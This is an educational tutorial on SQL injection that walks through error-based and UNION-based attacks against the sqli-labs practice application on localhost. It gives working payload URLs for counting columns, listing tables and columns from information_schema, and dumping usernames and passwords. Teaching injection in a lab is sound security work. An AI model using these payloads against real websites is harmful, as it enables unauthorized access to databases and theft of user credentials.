@@ -1,0 +1,170 @@
+
+Beginner’s Guide to SQL Injection (Part 1)
+
+SQL injection is a technique where malicious user can inject SQL Commands into an SQL statement via web page.
+An attacker could bypass authentication, access, modify and delete data within a database. In some cases, SQL Injection can even be used to execute commands on the operating system, potentially allowing an attacker to escalate to more damaging attacks inside of a network that sits behind a firewall.
+List of Database
+Type of SQL Injection
+SQLI Exploitation Technique
+Try to Identify- where the application interact with DB
+Basic SQL Functions
+SQL Injection Characters
+ Database Fingerprinting
+ We can find out the database by analyzing the error.
+First download sqli lab from here and setup in xampp Open SQLI labs
+https://github.com/Audi-1/sqli-labs
+
+Click on Setup/reset Database for labs
+
+
+Before jumping into Dhakkan lab
+Let’s first understand the basics. (How query gets executed at backend? How queries are formed? How can we break them? What exactly is sql injection?
+Consider a login page where you are requested to enter username and password, when you enter username and password a query (sql query) is generated at the backend which gets executed and result is displayed to us on home page after login.
+Username – Raj
+Password – Chandel
+So backend query will look like
+SELECT * FROM table_name WHERE username=’Raj’ AND password=’Chandel’;
+It is totally on the developer how he enclosed the parameter value in the sql query, he can enclose the parameter value in single quote, double quotes, double quotes with bracket etc.
+So query may look like
+SELECT * FROM table_name WHERE username=’Raj’ AND password=’Chandel’; 
+SELECT * FROM table_name WHERE username=(’Raj’) AND password=(’Chandel’);
+SELECT * FROM table_name WHERE username=”Raj” AND password=”Chandel”;
+SELECT * FROM table_name WHERE username=(“Raj”) AND password=(“Chandel”);
+Or in any form totally developer’s choice.
+I’ll explain further using first query.
+Q – What if I enter username = Raj’ ?
+Ans – If I enter username=Raj’ backend query will look like
+SELECT * FROM table_name WHERE username=’Raj’’ AND password=’Chandel’;
+Which is syntactically wrong because of an extra quote
+Q- How can we fix this broken query ? Is it possible to do so ?
+Ans – Yes it is possible to fix above query even with username = Raj’
+We can do so by commenting out the entire query after Raj’
+So our valid query will be
+SELECT * FROM table_name WHERE username=’Raj’
+Which is syntactically correct
+Q- How to comment out the remaining query ?
+Ans – Well it depends on the database that is there at the backend.
+We generally use –+ (hyphen hyphen plus), # (hash)
+So if I enter username = Raj’–+
+Complete query at backend will look like
+SELECT * FROM table_name WHERE username=’Raj’–+’ AND password=’Chandel’;
+But our database will read and execute only
+SELECT * FROM table_name WHERE username=’Raj’   this much query because everything after –+ will be commented and will not be interpreted as part of the query.
+This is what is called SQL INJECTION. Changing backend query using malicious input.
+I don’t know if you guys are having an interesting doubt or not but I had when I was learning all these stuff, and the doubt is
+According to above query formed by commenting we don’t need a valid password to login?
+Yes if the developer had not taken measure to prevent sql injection and implemented the query as shown above it is possible to login using only username.
+Confused? Don’t be. I’ll show you this in my upcoming articles. Now you are ready for lab, so let’s start.
+Click on lesson 1 and add id as parameter in the URL
+
+Keep on increasing id value (id=1, id=2…and so on) you will notice you will get empty screen with no username and password after id=14 which means database has 14 records.
+
+So backend query must be something like this
+SELECT * from table_name WHERE id=’1’;
+                                Or
+SELECT * from table_name WHERE id=(’1’);
+                                Or
+SELECT * from table_name WHERE id=”1”;   
+At this point we don’t know how developer enclosed the value of id parameter. Let’s find out
+Break the query by fuzzing, enter id=1’
+Boommm!! We get the SQL Syntax error. Since this error will help us in finding the back end query and we will do SQL injection using this error, this type of SQL Injection is called Error Based SQL Injection
+
+ 
+Now we have to analyze the error See screenshot
+ 
+
+You can also find out this using escape character, in mysql \ (back slash) is used to escape a character.
+Escaping a character means nullify the special purpose of that character. You will get clearer picture using escape character
+
+
+ 
+
+
+It is clear from above screenshots that backend query
+Less-1       –        SELECT * from table_name WHERE id=’our input’
+Less-2       –        SELECT * from table_name WHERE id=our input
+Less-3       –        SELECT * from table_name WHERE id=(’our input’)
+Less-4       –        SELECT * from table_name WHERE id=(“our input”)
+From now I’ll take Less-1 as base lesson to explain further
+With our input as 1’ complete backend query will be
+SELECT * from table_name WHERE id=’1’’ LIMIT 0,1
+Which is syntactically incorrect and I explained above how to make is syntactically correct
+By giving input 1’–+ (1 quote hyphen hyphen plus)
+Or By giving input 1’–%20 (%20 URL encoding for space)
+Or By giving input 1’%23 (%23 URL encoding for #)
+http://localhost/sqli/Less-1/?id=1′ –%20
+
+http://localhost/sqli/Less-1/?id=1′ %23 
+
+http://localhost/sqli/Less-1/?id=1′ –+
+
+Now we are able to break the query and are able to fix it syntactically.
+ What Next?
+Now we will try to add query between quote and –+ to get information from the database
+
+We’ll use another SELECT query here to get information from database.
+Q – Will two SELECT queries work together?
+ANS – NO, we have to use UNION operator to make it work.
+The UNION operator is used to combine the result-set of two or more SELECT statements.
+But for UNION operator there is one precondition that Number of columns on both side of UNION operator should be same.
+Since we don’t know the number of columns in the SELECT query at the backend so first we have to find the number of columns used in the SELECT query.
+For this we will use ORDER BY clause.
+ORDER BY clause will arrange the result set in ascending or descending order of the columns used in the query.
+ORDER BY country     à  will arrange the result set in asc order of elements of column (country)
+Now the problem is we even don’t know the names of the column…
+Solution to this problem is in ORDER BY clause…
+We’ll use ORDER BY 1, ORDER BY 2 etc. because ORDER BY 1 will arrange the result set in ascending order of the column present at first place in the query. (Please note, ORDER BY 1 will not arrange the result set according to first column of the table, it will arrange the result set in ascending order of the column present at first place in the query).
+Let’s try now
+http://localhost/sqli/Less-1/?id=1′ order by 1 –+    No Error
+
+http://localhost/sqli/Less-1/?id=1′ order by 2 –+    No Error
+
+http://localhost/sqli/Less-1/?id=1′ order by 4 –+    Error
+This shows that there is no 4th column in the query. So now we know there are 3 columns in the query at the backend.
+
+So now we can use UNION operator with another SELECT query.
+http://localhost/sqli/Less-1/?id=1′ union select 1,2,3 –+
+
+See there is no error but we are getting result set of first query, to get the result of second select query on the screen we have to make the result set of first query as EMPTY. This we can achieve by providing the id that does not exist. We can provide negative id or id >14 because in the starting of article we figured out that there are 14 ids in the database.
+http://localhost/sqli/Less-1/?id=-1′ union select 1,2,3 –+
+Or
+http://localhost/sqli/Less-1/?id=15′ union select 1,2,3 –+
+
+This shows we are getting values of column 2 and column 3 as output. So we’ll use these two columns to extract information about database and from database.
+http://localhost/sqli/Less-1/?id=-1′ union select 1,2,version() –+
+This will give the version of database used at the backend
+
+http://localhost/sqli/Less-1/?id=-1′ union select 1,database(),version() –+
+This will give the database we are using and current version of database used at the backend
+
+Since we are using UNION operator to perform SQL INJECTION, this type of injection is called UNION BASED SQL INJECTION ( a type of ERROR BASED SQL INJECTION)
+ Union Based Sql Injection
+In order for union injections to work, we should first know the name of tables in the database and for this type :
+Id=-1’ union select 1,table_name,3 from information_schema.tables where table_schema=database() –+
+
+As you know see that the above query will show us the name of one of the table in the database. For instance: emails
+Now, sometimes programmer may not print all the rows so we will have to check these rows of database one by one using limit keyword. Therefore, type:
+Id=-1’ union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1 –+
+
+As you can see that second table in data base is referers.
+Similarly, let’s check next table name.
+Id=-1’ union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1 –+
+
+This was one method to check table names, one by one, another method is getting all the table names once and together by using group concat keyword. This keyword presents all the table name as group. For this type :
+Id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() –+
+
+And as a result, which you can observe in above image, all the table names will be shown together.
+Now let’s check one of the tables presented to us. To extract information from a tables type:
+Id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+
+
+As you can see the above statement shows all the columns together due to the use of group_concat keyword. Also, we are using the word ‘column’ instead of ‘table’ because we want to know the column of a table now.
+Till now we have extracted different names of databases and its tables. Now lets see the content of a table. For this type:
+Id=-1’ union select 1,group_concat(username),3 from users –+
+
+The above statement will show us all the usernames from the table users. Now let’s check the passwords for these usernames. Type :
+Id=-1’ union select 1,group_concat(password),3 from users –+
+
+And like this you will have passwords to your usernames. There is another method to see usernames and passwords together with the following statement :
+Id=-1’ union select 1,group_concat(username),group_concat(password) from users –+
+
+Author – Rinkish Khera is a Web Application security consultant who loves competitive coding, hacking and learning new things about technology. Contact Here
